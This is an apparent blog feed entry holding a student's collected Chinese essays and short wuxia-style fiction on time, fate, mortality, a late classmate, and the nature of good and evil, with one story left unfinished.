    <content type="html"><![CDATA[<blockquote><p>“正经人谁写日记啊。”</p><p>“是啊。”</p><p>“你写日记吗。”</p><p>“我不写。”</p><p>“你写日记吗？”</p><p>“谁能把心里话写日记里？”</p><p>“写出来的哪能叫心里话？”</p><p>“下贱。”</p><p>“下贱。” </p><p>​                    ——《邪不压正》</p><p>​    这些东西是我高一高二写的，当时真的是文思如泉涌了，高三高四就没再写过这些，一直到现在也提不起兴趣去写一些东西，我把这些誊到博客上仅仅是想存一下，以防将来丢失，想了解我的人也可以从这些文章里看看曾经的我。虽然文笔有些许稚嫩，但这些东西我现在看来仍旧有所得。后之览者，亦将有感于斯文。</p></blockquote><h1 id="匆匆"><a href="#匆匆" class="headerlink" title="匆匆"></a>匆匆</h1><p>偶然间读又到《匆匆》这篇文章，又让我脑海里泛起对曾经的回忆，写这行字时，时光已经从我笔尖溜走了，我再也回不到刚才了，我再也回不到儿时了。我不经意间长大了，时光流逝的太快了，我想握紧手把时间握住，却发现它已经从我指尖的空隙里溜走了</p><p>我不经意间长大了……</p><h1 id="星辰"><a href="#星辰" class="headerlink" title="星辰"></a>星辰</h1><p>独自一人坐在屋顶上，望着浩瀚无垠的天空和一颗颗闪耀的星辰，我的灵魂从躯壳里离开，前往无尽的宇宙。我看到过一篇论文，上面说我们现在看到的星辰的光不是现在发出的，而是在遥远的古代发出的，或许我此时此刻看到的那束光，正是诸葛孔明运筹帷幄之间，决胜千里之外时发出的，异或是周公瑾谈笑间樯橹灰飞烟灭时发出的。我又看到兰陵王高长恭带一金色面具掩盖其俊美面容驰骋沙场无人能挡。我确实看到了历史，翻腾的历史长河正向前流着，从未停止。</p><h1 id="定数"><a href="#定数" class="headerlink" title="定数"></a>定数</h1><p>我把我的想法引入一个思维中，令它无限延伸。有人说人的命运从一开始就被注定好了，也就是人命天定，另外有人举出了反例，就是如果一个人注定就是富贵命的话是不是只要坐在家里什么都不干就行了，有何必要去奋斗呢？如果一个人注定是碌碌无为的话那么他奋斗与不奋斗的结果是一样的，那他又何必去奋斗呢？但在我看来，这样说是错的，如果一个人的一生生下来就被注定好的话，那么他的一切都是注定好的，努力，奋斗，也是命运使然，甚至我写下这个字也是命中注定好的，你看到这句话也是命里注定好的。命运的轮盘不停转着，我也悠悠然随波而行。</p><h1 id="升华"><a href="#升华" class="headerlink" title="升华"></a>升华</h1><p>从点到线，从线到面，面又围成空间，然后形成这个世界，这就是点的升华。我想起佛家所说的“一沙一世界”不也就是沙子中蕴含的奇妙吗？人心也是不断升华的过程，人心最初难明，心中朦胧一片，随后变为线向四面八方延伸最后化作一世界，人心虽小，却包罗万象。</p><h1 id="因果"><a href="#因果" class="headerlink" title="因果"></a>因果</h1><p>所谓因果其实是事件始末，佛语有云：“有因必有果”，正是如此。因就是埋下的种子，也就是事件的起源，埋下去，落地生根，早晚有一天会结出果子。当果子成熟之后便是事件结尾，周而复始，也应了那句话“不是不报，时候未到。”你所有的善终会在某个时间得到报偿，而恶也逃不了。</p><h1 id="生命"><a href="#生命" class="headerlink" title="生命"></a>生命</h1><p>人生苦短，悠悠几十载。我想不到生命竟会如此脆弱，更想不到仅仅是在电视上见过的病竟真真切切出现在我身边，病魔竟如此凶残，将前几周还在活蹦乱跳健康之人摧残的体无完肤，我不禁对这个世界感到恐惧了，难道让每个人都平平安安度过一生不好吗？非得让世间之人尝尽苦痛与离别吗？</p><h1 id="怀念"><a href="#怀念" class="headerlink" title="怀念"></a>怀念</h1><blockquote><p>​        本文写于生命写完的五月后，那个女孩已经去世了</p></blockquote><p>我以此文来怀念我曾经的同桌，那个已经被病魔夺去生命的女孩，正如之前有人说过的，我不知道我已经见了多少人最后一面了，想不到那次去医院探望她就是最后一次见面，在听到她的消息时早已阴阳相隔了。</p><h1 id="论正与邪"><a href="#论正与邪" class="headerlink" title="论正与邪"></a>论正与邪</h1><p>​        常常在小说里或者电视剧里看到，正义一方往往是浩然正气的道士或者是御剑飞行的剑仙，而邪恶一方往往是十恶不赦的大魔头。</p><p>​        这就是正与邪的定义吗？有侠肝义胆，重情重义，心怀天下之人非得是表面上一身正气的“正义之士”吗？所谓魔教之人就无这样吗？</p><p>​        那这样以来是不是正与邪就要重新划分了，修炼魔功但心怀天下之人与道士之中心怀正义之人一起来对抗心狠手辣之人。</p><p>​        不，这不是我想说的，我想讲人心。</p><p>​        在你心中，是否有正与邪的确切定义，人的本性真的如此高尚吗？</p><p>​        “我见过道貌岸然，自诩清高的大学教授在酒吧摇的比谁都社会，我也见过满身纹身的小伙子在公交车上给别人让座。”这句话被很多人奉为经典，但我想问，满身纹身的人就没在酒吧玩过吗？大学教授就没有给老人让过座吗？</p><p>​        一位本该在课堂上教书育人，去了所谓的风花雪月之地，就成了恶；一位本该打打杀杀之人，在公交车上的善行，就成了好人。两种人做了与自己身份不符合的事，其结果确是对立。</p><p>​        但我们有不能单凭身份去定义别人，大学教授就非得每天心怀孔孟之道，格物致知，清心寡欲吗？纹身之人也不一定每天打打杀杀。</p><p>​        朱熹曾言，存天理，去人欲。可何为人欲？人欲正是人与机械区分的唯一标准，若无人欲，何以为人？</p><p>​        又回到最初的问题，何为正与邪？</p><p>​        帝王者曰：“无论对错，我让他啊是正他就是正，我让他是邪他就是邪，我永为正，与我相抗之人即是邪。”</p><p>​        治世能臣曰：”保天下社稷为正，乱世之人为邪。“</p><p>​        奸佞小人曰：“助我升官发财为正，挡我仕路财路为邪。”</p><p>​        平民百姓曰：“处事公道，体恤百姓为正，徇私枉法，草菅人命为邪。”</p><p>​        笔者曰：“我不知何为正邪，我只知这世界分阴阳，黑白，此两者万物皆存，缺一不可。故万物皆有两面，世间绝无仅有一面之人。”</p><h1 id="得失寸心知"><a href="#得失寸心知" class="headerlink" title="得失寸心知"></a>得失寸心知</h1><blockquote><p>吾愿驾一叶之扁舟，游荡于天地之间，观尽山河之壮阔，波涛之汹涌。览先人之古迹，咏古畅怀，其中得失，唯有寸心可知。</p></blockquote><h2 id="问道"><a href="#问道" class="headerlink" title="问道"></a>问道</h2><p>青城山上，有一青年正拾阶而上，此人衣衫褴褛，满脸土灰，好像很多年没有洗过一样。他嘴里喃喃道，什么是人生呢？我将要去往何方呢？过路的人都对他投以鄙夷的目光，他对此也毫不在意。</p><p>他走到了山门前，大门紧闭，似乎是不欢迎他，他连扣了九下门，无人应答，他便再也耐不住性子，重重一脚踢在了门上，可他这一脚没有对门留下一丝一毫印记，反倒惊飞了门旁树上的飞鸟。</p><p>他失落的沿原地返回，当走到回程一半的时候发现了身后跟着一名老道士，他便问：“老牛鼻子，你跟着我干啥？”道士说:”解惑。”青年说:”好！我便问何为人生。”道士突然停住了，他抬头望天，天空霎时乌云密布，一道道闪电从天空划过，好似有真龙游走。天上下起了大雨，青年连忙躲到路旁屋子的屋檐下避雨，可那道士不躲反喜，他指着正在下落的雨滴说：“你可看清了何为人生？”青年摇头大喊道：“你恐怕是个疯子把，就下了一场雨，我如何看得清什么是人生？”道士哈哈大笑道：“这雨生于天，汇于海，这其中流淌的过程，便是人生！”</p><p>青年眼中闪过一丝亮光，可随即便暗淡下来，这不过是雨的人生罢了，与他又何干。</p><h2 id="大道无情"><a href="#大道无情" class="headerlink" title="大道无情"></a>大道无情</h2><p>昆仑山脉，有一中年修士正盘膝坐于地上，他此时陷入了一种玄妙的境界中，如果有有识之士看到，定会惊呼：“心劫！”</p><p>凡人修炼，修炼到一定境界之后必然会经历心劫，度过之后便可羽化飞升，得道成仙，可度过之人却寥寥无几。</p><p>在其识海之中，修士正执剑而立，在他对面是一中年美妇，竟是他的妻子，只见那妇女正想他走来。</p><p>那美妇走到他跟前，中年修士正要去拥抱他，可她却从怀里抽出一把匕首，一下刺入了修士的胸膛。</p><p>他一把推开她，看着身上的伤口，仰天大笑。那美妇化作一团黑雾，黑雾中透出诡异的声音：“你终究是输了。”修士脸上笑容渐渐消失。他说：“或许大道无情，可我做不到，我一直活下去便是因对她的执念，我其实早就看出她是域外天魔所化，可杀她我做不到。”说罢，身死道消。</p><p>大道无情，可为了自己的情与大道相抗，究竟是谁输了呢？</p><h2 id="断情决"><a href="#断情决" class="headerlink" title="断情决"></a>断情决</h2><p>“啊！别杀我！爹爹！”林宇突然从床上坐起，他发现被子已经被自己的汗水浸透，他已经数不清自己做了多少次这样的噩梦了。</p><p>他本是一名孤儿，在其三岁时被其现任养父林啸天收养。说起林啸天，在江湖上可谓是无人不知，无人不晓。他早在二十年前一身武功便已冠绝武林。九为极数，这个江湖最高境界便是九重。江湖有传闻他早已入第八重“臻化之境”，只差一步便可到达第九重“羽化之境”，倒时便可破碎虚空，羽化飞升，享无尽之寿元。</p><p>但是林啸天于十五年前突然退隐江湖，从此不问世事，江湖中传言他得了一本武林秘籍，在潜心修炼，但是究竟如何，没人说得清。</p><p>林宇回想着先前的噩梦，只见林啸天面容扭曲狰狞，拿着一把长剑挥舞，周围空气中弥漫着层层剑影，把林宇看的眼花缭乱。突然，林啸天一剑刺来，林宇连连后退，可他又怎能快过林啸天的剑，当剑即将刺入他胸口时，他突然惊醒了。</p><p>他打开门，呼吸了一下窗外的空气。心中想到：还好这不是真的，父亲平日里这么疼爱我，怎么会杀我呢？可是我为什么会做这样的梦呢？这时，耳边突然传来了那个熟悉的声音：“宇儿，快来吃饭了！”他便去了大堂，桌上早已摆满了饭菜。</p><p>正当林宇正津津有味地吃着饭时，窗外突然传来一声巨响，林宇赶快跑出屋子，却见林啸天正执剑而立，而面前站的却是一带青面獠牙面具，浑身包裹在黑雾里的人，如果有识之士看到，定会惊呼：“青面魔君！”此人生性凶狠，专好收集武林秘籍，曾有千人家族不愿交出祖传秘籍而被其一夜之间屠戮殆尽。一身魔功无人能敌，传言再有半步便可踏入“羽化之境”。</p><p>魔君说：“林啸天，快把秘籍交出来，老夫饶你不死。”</p><p>林啸天厉声叫道：“想拿秘籍，就先从我尸体上踏过去！”</p><p>话音未落，两人便在空中展开了搏杀，只见林啸天四周弥漫着剑气，时而飞出一道冲向魔君，而青面魔君则是屈指为爪，四周是漫天爪影，让人分不清虚实。</p><p>说时迟，那时快，魔君突然屈爪为拳，一拳轰在了林啸天身上，林啸天闷哼一声，口吐鲜血，直挺挺得飞出了十几米远，躺在地上动也不动，魔君上前探时，已无鼻息。</p><p>魔君在林啸天身上搜了半天，却并无任何发现，偏转向林宇，发出低沉的吼声：“你父亲的秘籍在哪？快交出来，老夫给你留一个全尸。”说罢，向林宇走去，身上魔气翻腾，似乎是要将林宇吞噬。</p><p>林宇看到父亲被杀，一身热血直往天灵盖冲，便抄起地上一块砖头，向魔君扑去，可林啸天从未教过他武功，他又如何敌的过魔君？</p><p>只见魔君轻轻挥了挥爪，林宇却觉得自己像是被锁定了一样，漫天爪影向其袭来，他胸前被抓出了一个大洞，鲜血如注般喷涌。</p><p>魔君身后…..</p><h1 id="铁拳"><a href="#铁拳" class="headerlink" title="铁拳"></a>铁拳</h1><blockquote><p>为啥你不奋起反抗呀？</p><p>因为铁拳没砸到我头上。</p></blockquote><p>这只铁拳拥有着上天下地，无与伦比的力量，这是最好的时代，也是最坏的时代，时代的尘埃，随便落到一个普通人身上都会砸死人。</p><h1 id="语言的力量"><a href="#语言的力量" class="headerlink" title="语言的力量"></a>语言的力量</h1><blockquote><p>语言可以说是这世界上最强大的武器了，古往今来，任何能称之为壮举的东西都少不了语言的力量</p></blockquote><p>1111</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂文</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
